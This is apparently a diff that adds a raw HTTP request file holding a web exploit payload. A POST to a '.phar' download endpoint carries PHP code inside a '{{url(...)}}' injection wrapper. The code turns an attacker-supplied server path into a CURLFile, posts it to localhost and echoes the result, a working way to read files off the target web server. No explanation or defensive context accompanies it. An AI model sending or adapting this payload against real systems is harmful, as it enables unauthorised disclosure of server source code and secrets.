@@ -1,0 +1,15 @@
+POST /?down=abcd.phar HTTP/1.1
+Host: xxxxxxxxxxxx
+Content-Type: application/x-www-form-urlencoded
+
+0=/var/www/html/test1.php&1={{url(<?php
+$cu = curl_init('http://localhost/');
+curl_setopt($cu, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($cu, CURLOPT_POST, true);
+$f = new CURLFile($_POST[0]);
+curl_setopt($cu, CURLOPT_POSTFIELDS, [
+    'f' => $f,
+]);
+$data = curl_exec($cu);
+echo $data;
+)}}
